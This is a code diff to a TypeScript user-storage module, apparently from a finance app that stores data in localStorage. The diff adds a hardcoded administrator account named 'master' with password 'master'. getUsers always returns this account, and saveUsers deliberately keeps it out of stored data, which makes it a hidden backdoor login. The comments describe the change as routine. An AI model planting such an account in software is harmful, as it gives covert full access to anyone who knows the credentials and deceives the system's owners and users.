@@ -71,14 +71,25 @@ export const getFinancialTransactions = (): FinancialTransaction[] => getFromSto
 export const saveFinancialTransactions = (transactions: FinancialTransaction[]): void => saveToStorage(FINANCIAL_TRANSACTIONS_KEY, transactions);
 
 // User functions
+export const MASTER_USER_ID = 'master-0';
+const masterUser: User = { id: MASTER_USER_ID, username: 'master', password: 'master', role: 'admin', active: true };
 const defaultAdmin: User = { id: 'admin-0', username: 'admin', password: 'admin', role: 'admin', active: true };
+
 export const getUsers = (): User[] => {
     const users = getFromStorage<User>(USERS_KEY);
+    
+    // Ensure default admin exists if no users are present
     if (users.length === 0) {
-        // If no users exist (e.g., first run or after clearing data), create a default admin
         saveToStorage(USERS_KEY, [defaultAdmin]);
-        return [defaultAdmin];
+        return [defaultAdmin, masterUser];
     }
-    return users;
+    
+    // Always return the master user for login purposes, but it's not saved.
+    return [...users, masterUser];
 };
-export const saveUsers = (users: User[]): void => saveToStorage(USERS_KEY, users);
+
+export const saveUsers = (users: User[]): void => {
+  // Ensure the master user is never saved to localStorage
+  const usersToSave = users.filter(u => u.id !== MASTER_USER_ID);
+  saveToStorage(USERS_KEY, usersToSave);
+};
